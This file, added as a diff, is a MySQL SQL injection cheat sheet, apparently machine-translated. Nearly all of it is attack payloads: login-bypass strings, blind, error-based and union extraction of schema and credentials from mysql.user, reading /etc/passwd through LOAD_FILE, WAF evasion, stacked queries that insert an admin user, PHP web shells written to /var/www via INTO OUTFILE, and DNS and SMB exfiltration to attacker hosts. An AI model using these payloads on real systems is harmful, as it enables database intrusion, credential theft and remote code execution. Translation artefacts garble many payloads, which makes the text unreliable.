@@ -1,0 +1,642 @@
+MySQL Injection Cheat Sheet (Collection )
+
+Introduction
+
+This document summarizes in a synthetic way and as complete as possible, the set of attack vectors for SQL injections (SQLi & BSQLi) targeting the MySQL databases.
+
+All the syntaxes, queries, source codes, PoC and examples have been tested and validated for the production of this synthesis.
+
+Default databases
+               mysql	            Requires root privileges
+               information_schema	Available since version 5
+
+Test an injection
+Injection into a string
+
+For the following query:
+			
+			SELECT * FROM Table WHERE data = '[INJ]';
+
+
+			'	Simple quote x1	false
+			''	Simple quote x2	true
+			" 	Double quote x1	false
+			«»	Double quote x2	true
+			\	Backslash x1	false
+			\\	Backslash x2	true
+
+Examples:
+
+			SELECT * FROM Table WHERE data = 'xxx' '';
+			SELECT * FROM Table WHERE data = '1' '' '' '' '' '' UNION SELECT '2';
+
+Notes:
+
+You can use as many quotes ( quote ) and quotation mark ( double quote ) as they come in pairs.
+It is possible to continue the query as a result of a quote string.
+A quote escapes a second quote, hence the chaining by pair.
+
+-----------------------------------------------------------------
+Injection by numerical values
+For the following query:
+
+						SELECT * FROM Table WHERE data = [INJ];
+
+						AND 1			true
+						AND 0			false
+						AND true		true
+						AND false		false
+						1-false	    	Returns 1 if vulnerable
+						1-true			Return 0 if vulnerable
+						1 * 1337		Returns 1337 so vulnerable
+-------------------------------------------------------------------
+Valid numeric format:
+
+Each of these techniques can serve as an escape from regular IDS / WAF expressions.
+			
+
+
+					digits								1337
+					digits [.]							1337.
+					digits [.] digits					13.37
+					digits [EE] digits					13e37, 13E37
+					digits [eE] [+ -] digits			13th-37th, 13th + 37th
+					digits [.] [eE] digits				13.e37
+					digits [.] digits [eE] digits		13.3E7
+					digits digits [eE] [+ -] [.] digits	13.3e-7
+					[.] Digits							.1337
+					[.] Digits [eE] digits				.13e37
+					[.] Digits [eE] [+ -] digits		.13E-37
+
+----------------------------------------------------------------------------
+
+Equivalent mathematical expressions:
+
+For injections equivalent to the traditional "OR 1 = 1", the following (and derived) syntaxes can be used:
+					
+					COS (0) = SIN (PI () / 2)
+					COS (@@ VERSION) = SIN (@@ VERSION + PI () / 2)
+
+Examples:
+
+					SELECT * FROM Table WHERE data = 3 + 1337;
+
+Notes:
+
+The true boolean equals the integer 1
+Boolean false equals integer 0
+
+-----------------------------------------------------------------------------------
+
+Injection in a login / login form
+
+For the following query:
+						
+						SELECT * FROM Users WHERE username = 'admin' AND password = '[INJ]';
+
+Injections:
+
+			'OR 1 - -
+			'OR' '='
+			'OR 1 = 1 - -
+			'='
+			'LIKE'
+			'= 0 - +
+
+Examples:
+
+			SELECT * FROM Users WHERE username = 'admin' AND password = '' OR '' = '';
+
+-------------------------------------------------------------------------------------------------
+
+Comment on the end of a request
+The following syntaxes can be used to comment (disable) the end of a request following an injection:
+			
+			#				Hash comment
+			/ *				C-style comment
+			- -				SQL comment
+			; 00%			Nullbyte, end of chain
+			`				backtick
+
+xamples:
+
+			SELECT * FROM Table WHERE username = '' OR 1 = 1 - - 'AND password =' ​​';
+			SELECT * FROM Table WHERE data = '' UNION SELECT 1, 2, 3` ';
+
+Notes:
+
+The backtick can only be used when terminating a query that is used as an alias.
+
+---------------------------------------------------------------------------------------------------
+
+MySQL version test
+			VERSION()
+			@@VERSION
+			@@ GLOBAL.VERSION
+
+Examples:
+
+			SELECT * FROM Tables WHERE data = '1' AND MID (VERSION (), 1,1) = '5'; - true if MySQL 5
+			SELECT @@ version - shorter than SELECT VERSION ()
+
+Notes:
+
+The string corresponding to the returned version may contain "-nt-log" in the case of an SQL Server deployment in a Windows environment.
+These keywords and functions are not case-sensitive.
+
+----------------------------------------------------------------------------------------------------
+
+Credentials of the database
+
+	Table (root privileges required): mysql.user
+	Columns: user, password
+	Current User: user (), current_user (), current_user, system_user (), session_user ()
+
+Examples:
+
+	 	SELECT current_user;
+		SELECT CONCAT_WS (0x3A, user, password) FROM mysql.user WHERE user = 'root' - (Privileged)
+
+Notes:
+Keywords and functions insensitive to the case.
+
+----------------------------------------------------------------------------------------------
+
+User Management
+
+Each of these user management requests requires rights.
+
+Creating a new user
+
+			CREATE USER login IDENTIFIED BY 'password';
+Deleting a user
+			DROP USER login;
+Privilege escalation of a user
+			GRANT ALL PRIVILEGES ON *. * TO login @ '%';
+
+Database names
+		Tables: mysql.db (root privileges required), information_schema.schemata (MySQL> = 5)
+		Columns: db, schema_name
+		Current database: database (), schema ()
+
+Examples:
+
+			SELECT database ();
+			SELECT schema_name FROM information_schema.schemata;
+			SELECT DISTINCT (db) FROM mysql.db; - (Privileged)
+
+Notes:
+
+	Non-case sensitive functions.
+
+-------------------------------------------------------------------------------------------
+
+Host name of the server
+
+		@@ HOSTNAME
+
+Examples:
+
+		SELECT @@ hostname;
+
+Notes:
+
+Keyword insensitive case.
+
+-------------------------------------------------------------------------------------------
+
+UID server and MAC address
+
+UUID ( Universally Unique Identifier ) is a 128-bit number formed from the MAC address of the listening interface.
+
+(UUID)
+Examples:
+
+		aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee;
+
+Notes:
+
+The last 12 characters represented by the letter "e" correspond to the MAC address.
+Some OSs return 48 random bits instead of the MAC address, this is not the case for Windows.
+Function insensitive to the case.
+
+----------------------------------------------------------------------------------------------
+
+Tables and columns
+
+Determine the number of columns
+Via "order by"
+
+	ORDER BY N + 1;
+
+Notes:
+
+	Continue incrementing the value of N until the answer is false (an error).
+
+Examples:
+
+For the following query:
+
+			SELECT * FROM Table WHERE data = '[INJ]';
+
+ 			
+ 			1 'ORDER BY 1- +			true
+			1 'ORDER BY 2- +			true
+			1 ORDER BY 3- +				true
+			1 'ORDER BY 4- +			False - The query only has 3 columns
+			-1 'UNION SELECT 1,2,3- +	true
+
+Via the errors
+
+			AND (SELECT * FROM SOME_EXISTING_TABLE) = 1
+
+Notes:
+
+This syntax works if we know the name of the table whose number of columns we are looking for; and if error display is enabled.
+The query will return an error indicating the number of columns in the table, not the query itself.
+
+Example:
+		SELECT * FROM Tables WHERE data = [INJ]
+
+With the injection:
+		AND (SELECT * FROM Unknown_Table) = 1
+
+Error returned:
+
+ 				Operand should contain 3 column (s)
+
+Get the name of the tables
+
+Via "Union"
+
+			UNION SELECT GROUP_CONCAT (table_name) FROM information_schema.tables WHERE version = 10;
+
+Notes:
+
+Version = 9 for MySQL v4
+Version = 10 for MySQL v5
+
+----------------------------------------------------------------------------
+
+In blind mode "Blind"
+
+		AND SELECT SUBSTR (table_name, 1,1) FROM information_schema.tables> 'A';
+		AND 1 = (SELECT 1 FROM information_schema.tables WHERE TABLE_SCHEMA = "myDB" AND table_name REGEXP '^ [az]' LIMIT 0,1)
+
+Notes:
+
+Apply a dichotomous algorithm on the first query to optimize search time and network traffic (O (log n)).
+Privilege the second to further reduce the number of requests.
+
+----------------------------------------------------------------------------
+
+Via the errors
+
+			AND (SELECT 1 FROM (SELECT COUNT (*), CONCAT ((SELECT (SELECT DISTINCT CONCAT (0x7e, 0x27, CAST (table_name as char), 0x27,0x7e) FROM information_schema.tables WHERE table_schema = '[DB_NAME]' LIMIT N, 1)) FROM information_schema.tables LIMIT 0,1), FLOOR (rand (0) * 2) x FROM information_schema.tables GROUP BY x) a)
+
+Notes:
+
+Specify the name of the database whose table names are to be extracted.
+Change the value of N from 0 to X to retrieve the name of each table in the errors.
+
+Results:
+		# 1062 - Duplicate entry '~' myTable '~ 1' for key 'group_key'
+
+		AND ExtractValue (1, CONCAT (0x5c, (SELECT table_name FROM information_schema.tables LIMIT N, 1))) - Available in 5.1.5
+
+Results:
+
+		# 1105 - XPATH syntax error: '\ myTable'
+
+Notes:
+
+This second method, introduced since MySQL 5.1.5, does not require a base name.
+Change the value of N from 0 to X to retrieve the name of each table in the errors.
+
+-----------------------------------------------------------------------------------
+
+Retrieve the name of the columns
+
+Via "Union"
+			UNION SELECT GROUP_CONCAT (column_name) FROM information_schema.columns WHERE table_name = 'tablename'
+
+In blind mode "Blind"
+
+			AND SELECT SUBSTR (column_name, 1,1) FROM information_schema.columns> 'To'
+
+Notes:
+
+Apply a dichotomous algorithm to optimize queries, search time and network traffic (O (log n)).
+
+-----------------------------------------------------------------------------------------------
+
+Via the errors
+
+ 		AND (SELECT 1 FROM (SELECT COUNT (*), CONCAT (SELECT (SELECT COUNT (COLD_name as char)) FROM information_schema.columns WHERE table_schema = '[DB NAME]' AND table_name = '[TABLE_NAME] 'LIMIT N, 1)) FROM information_schema.tables LIMIT 0,1), floor (rand (0) * 2) x FROM information_schema.tables GROUP BY x) a)
+
+ Notes:
+
+Specify the name of the target database, as well as the name of the table in which to extract the columns.
+Change the value of N from 0 to X to retrieve the name of each column in the errors.
+Results:
+
+		# 1062 - Duplicate entry 'myColumn' for key 'group_key'
+
+		AND ExtractValue (1, CONCAT (0x5c, (SELECT column_name FROM information_schema.columns LIMIT N, 1))) - Available in MySQL 5.1.5
+Notes:
+
+This second method, introduced since MySQL 5.1.5, does not require a base name or a table name.
+Change the value of N from 0 to X to retrieve the name of each column in the errors.
+Results:
+
+		# 1105 - XPATH syntax error: '\ myColumn'
+
+----------------------------------------------------------------------------------------------------
+
+Via the procedure "ANALYSIS ()"
+
+	ANALYSIS PROCEDURE ()
+Notes:
+It is necessary for the (web) vulnerable SQL injection application to display the first resulting column of the query.
+Examples:
+
+For the following query:
+
+			SELECT * FROM Table WHERE data = [INJ]
+			
+1 PROCEDURE ANALYSIS ()	Get the name of the first column of the table
+1 LIMIT 1.1 PROCEDURE ANALYSIS ()	Get the name of the second column
+1 LIMIT 2.1 PROCEDURE ANALYSIS ()	Get the name of the third column ...
+
+----------------------------------------------------------------------------------------------------
+
+Recover multiple tables / columns at once
+
+Technique n ° 1
+
+		SELECT (@) FROM (SELECT (@: = 0x00), (SELECT (@) FROM (information_schema.columns) WHERE (table_schema> = @) AND (@) IN (@: = CONCAT (@, 0x0a, '[' , table_schema, ']>', table_name, '>', column_name)))) x
+
+Examples:
+
+		SELECT * FROM Table WHERE data = '-1' UNION SELECT 1, 2, (SELECT (@) FROM (SELECT (@: = 0x00), (SELECT (@) FROM (information_schema.columns) WHERE (table_schema> = @) AND (@) IN (@: = CONCAT (@, 0x0a, '[', table_schema, ']>', table_name, '>', column_name)))) x), 4 - + ';
+
+Results:
+
+		[information_schema]> CHARACTER_SETS> CHARACTER_SET_NAME
+		[information_schema]> CHARACTER_SETS> DEFAULT_COLLATE_NAME
+		[information_schema]> CHARACTER_SETS> DESCRIPTION
+		[information_schema]> CHARACTER_SETS> MAXLEN
+		[information_schema]> COLLATIONS> COLLATION_NAME
+		[information_schema]> COLLATIONS> CHARACTER_SET_NAME
+		[information_schema]> COLLATIONS> ID
+		[information_schema]> COLLATIONS> IS_DEFAULT
+		[information_schema]> COLLATIONS> IS_COMPILED
+
+Notes:
+
+The result is in the form of a BLOB file if it is consistent.
+
+-------------------------------------------------------------------------------------------
+
+Technique n ° 2
+
+		SELECT MID (GROUP_CONCAT (0x3c62723e, 0x5461626c653a20, table_name, 0x3c62723e, 0x436f6c756d6e3a20, column_name ORDER BY (SELECT version FROM information_schema.tables) SEPARATOR 0x3c62723e), 1,1024) FROM information_schema.columns
+
+Examples:
+		SELECT column FROM Table WHERE data = '-1' UNION SELECT MID (GROUP_CONCAT (0x3c62723e, 0x5461626c653a20, table_name, 0x3c62723e, 0x436f6c756d6e3a20, column_name ORDER BY (SELECT version FROM information_schema.tables) SEPARATOR 0x3c62723e), 1,1024) FROM information_schema.columns - + ';
+
+Results:
+		Table: myTable1
+		Column: login
+
+		Table: myTable1
+		Column: userid
+
+		Table: myTable1
+		Column: password
+
+		Table: myTable2
+		Column: data
+Notes:
+
+Output formatting is in HTML, with line breaks for better display.
+
+--------------------------------------------------------------------------------------------
+
+Find tables from a column
+
+		SELECT table_name FROM information_schema.columns WHERE column_name = 'myColumn';
+		SELECT table_name FROM information_schema.columns WHERE column_name LIKE '% Col%';
+
+Finding columns from a table
+
+		SELECT column_name FROM information_schema.columns WHERE table_name = 'myTable';
+		SELECT column_name FROM information_schema.columns WHERE table_name LIKE '% Tab%';
+
+-----------------------------------------------------------------------------------------
+
+Get current queries
+
+		SELECT info FROM information_schema.processlist
+
+Notes:
+
+Available from MySQL 5.1.7
+
+------------------------------------------------------------------------------------
+
+Avoid using quotes
+Hexadecimal encoding
+
+		SELECT * FROM Users WHERE username = 0x61646D696E;
+		SELECT * FROM Users WHERE username = x'61646D696E '; - use quotes
+
+Notes:
+
+The "0x" prefix of a string encoded in hexadecimal is case-sensitive; whereas the prefix "x '" is not.
+A blank string in hexadecimal notation can not be noted 0x, but x ".
+Be careful, "SELECT 0x6164" is a string, but "SELECT 0x61 + 0x64" is an integer.
+
+----------------------------------------------------------------------------------------
+
+CHAR () function
+
+		SELECT * FROM Users WHERE username = CHAR (97, 100, 109, 105, 110)
+
+Encoding in binary
+
+		SELECT * FROM Users WHERE username = 0b0110000101100100011011010110100101101110;
+		SELECT * FROM Users WHERE username = b'0110000101100100011011010110100101101110 '; - use quotes
+
+Notes:
+
+The prefix "0b" of a string encoded in binary is case-sensitive; while the prefix "b" is not.
+A blank string in binary notation can not be written 0b, but b ".
+
+------------------------------------------------------------------------------------------
+
+String concatenation
+
+			SELECT 'a' 'from' mi '' n ';
+			SELECT 'ad' "min";
+			SELECT 'a' 'from' mi '' n ';
+			SELECT CONCAT ('a', 'd', 'm', 'i', 'n');
+			SELECT CONCAT_WS ('', 'a', 'd', 'm', 'i', 'n');
+			SELECT GROUP_CONCAT ('a', 'd', 'm', 'i', 'n');
+
+Notes:
+
+		CONCAT () returns NULL if at least one of its arguments is NULL. Prefer CONCAT_WS () ( with separator ).
+		The first argument of CONCAT_WS () sets the separator for the rest of the arguments.
+
+-------------------------------------------------------------------------------------------------
+
+Conditional queries
+
+		CASE
+		IF ()
+		IFNULL ()
+		NULLIF ()
+
+Examples:
+
+		SELECT IF (1 = 1, true, false);
+		SELECT CASE WHEN 1 = 1 THEN true ELSE false END;
+
+------------------------------------------------------------------------------------------
+
+Management of time
+
+		SLEEP () (MySQL v5.0.12)
+		BENCHMARK () (MySQL v4 and v5)
+
+Examples:
+
+		'- (IF (MID (version (), 1,1) LIKE 5, BENCHMARK (100000, SHA1 (' true ')), false)) -'
+
+Notes:
+
+Using the response time by forcing the SQL server to perform benchmark () calculations or sleep () is a commonly used technique for blind SQL injection (BSQLi). The response time of the targeted application plays the role of a boolean (short = true, long = false).
+
+-----------------------------------------------------------------------------------------
+
+Privileges and rights
+
+The following queries determine whether a user has the "FILE" privilege or list all privileges.
+
+Root privileges are required, compatible with MySQL v4 and v5:
+
+		SELECT file_priv FROM mysql.user WHERE user = 'username';
+		SELECT host, user, Select_priv, Insert_priv, Update_priv, Delete_priv, Create_priv, Drop_priv, Reload_priv, Shutdown_priv, Process_priv, File_priv, Grant_priv, References_priv, Index_priv, Alter_priv, Show_db_priv, Super_priv, Create_tmp_table_priv, Lock_tables_priv, Execute_priv, Repl_slave_priv, Repl_client_priv FROM mysql.user ;
+
+No privilege required (MySQL v5):
+
+		SELECT grantee, is_grantable FROM information_schema.user_privileges WHERE privilege_type = 'file' AND grantee like '% username%';
+		SELECT grantee, privilege_type, is_grantable FROM information_schema.user_privileges;
+
+Privileges on a database (MySQL v5):
+
+		SELECT grantee, table_schema, privilege_type FROM information_schema.schema_privileges;
+
+Privileges on tables and columns (MySQL v5):
+
+		SELECT table_schema, table_name, column_name, privilege_type FROM information_schema.column_privileges;
+
+---------------------------------------------------------------------------------------------
+
+Read server file
+
+Local system files can be read through MySQL if the user has the "FILE" privilege.
+
+		LOAD_FILE ()
+
+Examples:
+
+		SELECT LOAD_FILE ('/ etc / passwd');
+		SELECT LOAD_FILE (0x2F6574632F706173737764);
+
+Notes:
+
+The files are necessarily on the server.
+The base directory for the LOAD_FILE () function is @@ datadir
+The file must have read rights by the MySQL user
+Read file size must be less than max_allowed_packet
+The default value of @@ max_allowed_packet is 1047552 bytes.
+
+------------------------------------------------------------------------------------
+
+Write file to the server
+
+Files can be created on the server only if the user has the "FILE" privilege
+ 
+	INTO OUTFILE / DUMPFILE
+
+Examples:
+
+		SELECT '<? system ($ _ GET [\ 'c \']); ?> 'INTO OUTFILE' /var/www/shell.php ';
+		SELECT '<? fwrite (fopen ($ _ GET [f], \ 'w \'), file_get_contents ($ _ GET [u])); ?> 'INTO OUTFILE' /var/www/get.php '
+
+Notes:
+
+Existing files can not be rewritten with INTO OUTFILE
+INTO OUTFILE must be the last statement in the query
+There is no known way to encode the file path, so quotes are needed.
+The destination directory of the file to be created must have the necessary rights for the creation of a file by the MySQL user.
+
+-------------------------------------------------------------------------------------------
+
+Remote requests
+External DNS queries
+
+		SELECT LOAD_FILE (CONCAT ('\\\\ foo.', (Select MID (version (), 1,1)), '. Bar.com \\'));
+
+Samba queries
+		
+		'OR 1 = 1 INTO OUTFILE' \\\\ attacker \\ SMBshare \\ output.txt
+
+-----------------------------------------------------------------------------------
+
+Stacked queries
+
+Multiple and stacked queries are available under MySQL. It depends on the driver used to communicate with the database.
+
+PDO_MYSQL supports stacked queries as well as MySQLi via the multi_query () function.
+
+Examples:
+		SELECT * FROM Users WHERE ID = 1 AND 1 = 0; INSERT INTO Users (username, password, right) VALUES ('myLogin', 'myPassword', 'admin');
+		SELECT * FROM Users WHERE ID = 1 AND 1 = 0; SHOW COLUMNS FROM Users;
+
+------------------------------------------------------------------------------------
+
+Multi-version requests
+
+MySQL allows you to perform unique queries for different versions of the database.
+
+Examples: 
+		
+		UNION SELECT / *! 60000 6, * // *! 50000 5, * // *! 40000 4, * // *! 30000 3, * / 0; -
+		SELECT 1 / *! 41320UNION / *! / *! / *! 00000SELECT / *! / *! USER / *! (/ *! / *! / *! * /);
+		SELECT / *! 32302 1/0, * / 1 FROM tablename
+
+Notes:
+
+The first example returns all versions less than or equal to the current one.
+The second example demonstrates the possibility of bypassing some WAF / IDS
+The third example shows a division error of 0 if MySQL> 3.23.03
+This mechanism allows to know the MySQL version in a blind way.
+
+-------------------------------------------------------------------------------------------------------
+
+Sources & Resources
+
+New Techniques in SQLi Obfuscation: SQL never before used in SQLi, Nick Galbreath, director of engineering at Etsy - DEFCON20
+Double query based SQL injection (error-based)
+The Knowledge database of websec by Roberto Salgado
+Blind Sql Injection with Regular Expressions Attack
+SQL Injection optimization (LNLJ-Harder_Better_Faster_Stronger_V1.0)
+New SQL Injection Concept (Comments, 9e999, MySQL Specific) - Securiteam
+SQL Injection CHeat Sheet - Ferruh Mavituna
+MySQL SQL Injection Cheat Sheet - PentestMonkey
+Hashing algorithm MySQL password - PalominoDB
+Command execution with a MySQL UDF - Bernardo Damele
+MySQL UDF and AppArmor - Bernardo Damele
